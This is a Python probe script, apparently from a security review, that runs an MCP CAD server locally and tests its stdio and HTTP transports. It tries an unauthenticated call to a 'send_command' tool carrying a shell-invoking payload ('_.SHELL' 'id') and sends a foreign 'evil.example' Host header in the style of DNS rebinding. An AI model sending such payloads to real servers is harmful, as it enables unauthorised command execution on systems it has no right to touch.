"""Reviewer transport probes: the product's server.py as a real subprocess over stdio and streamable-http.
COM is replaced by probes/stubs via PYTHONPATH; FAKECAD selects no-CAD or in-memory fake.
"""
import asyncio, json, os, subprocess, sys, time

import httpx
from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

OUT = []
ENV = dict(os.environ, PYTHONPATH="/out/probes/stubs", PYTHONIOENCODING="utf-8")


def text(r):
    return " ".join(getattr(c, "text", "") for c in r.content)[:300]


async def stdio_probe():
    params = StdioServerParameters(command="python", args=["/work/src/server.py"], env=dict(ENV, FAKECAD="none"))
    async with stdio_client(params) as (rd, wr):
        async with ClientSession(rd, wr) as s:
            init = await s.initialize()
            tools = (await s.list_tools()).tools
            OUT.append({"probe": "stdio.initialize+list_tools", "result": "PASS" if len(tools) == 35 else "FAIL",
                        "detail": {"server": init.serverInfo.name, "tools": len(tools)}})
            r = await s.call_tool("draw_circle", {"center": [0, 0], "radius": -1})
            OUT.append({"probe": "stdio.draw_circle_negative_radius", "result": "PASS" if r.isError else "FAIL",
                        "detail": text(r)})
            r = await s.call_tool("draw_line", {"start_point": [0, 0], "end_point": [1, 1]})
            sc = r.structuredContent or {}
            OUT.append({"probe": "stdio.draw_line_no_cad", "result": "PASS" if sc.get("success") is False else "FAIL",
                        "detail": sc})


def http_probe():
    proc = subprocess.Popen(["python", "/work/src/server.py", "--transport", "streamable-http", "--port", "8765"],
                            env=dict(ENV, FAKECAD="mem"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        url = "http://127.0.0.1:8765/mcp"
        h = {"Accept": "application/json, text/event-stream", "Content-Type": "application/json"}
        for _ in range(60):
            try:
                httpx.get("http://127.0.0.1:8765/", timeout=1)
                break
            except Exception:
                time.sleep(0.5)
        init = {"jsonrpc": "2.0", "id": 1, "method": "initialize",
                "params": {"protocolVersion": "2025-06-18", "capabilities": {}, "clientInfo": {"name": "probe", "version": "0"}}}
        r = httpx.post(url, json=init, headers=h, timeout=10)
        sid = r.headers.get("mcp-session-id")
        OUT.append({"probe": "http.initialize_without_credentials", "result": "OBSERVED",
                    "detail": {"status": r.status_code, "session": bool(sid)}})
        if sid:
            h2 = dict(h, **{"mcp-session-id": sid})
            httpx.post(url, json={"jsonrpc": "2.0", "method": "notifications/initialized"}, headers=h2, timeout=10)
            call = {"jsonrpc": "2.0", "id": 2, "method": "tools/call",
                    "params": {"name": "send_command", "arguments": {"command": "(command \"_.SHELL\" \"id\")"}}}
            r2 = httpx.post(url, json=call, headers=h2, timeout=60)
            OUT.append({"probe": "http.unauthenticated_send_command", "result": "REPRODUCED" if '\\"success\\": true' in r2.text or '"success":true' in r2.text.replace(" ", "") else "NOT_REPRODUCED",
                        "detail": {"status": r2.status_code, "body": r2.text[:400]}})
        # foreign Host header (DNS-rebinding style)
        r3 = httpx.post(url, json=init, headers=dict(h, Host="evil.example"), timeout=10)
        OUT.append({"probe": "http.foreign_host_header", "result": "OBSERVED", "detail": {"status": r3.status_code, "body": r3.text[:200]}})
    finally:
        proc.terminate()
        proc.wait(10)


asyncio.run(stdio_probe())
http_probe()
print(json.dumps(OUT, ensure_ascii=False, indent=1, default=str))
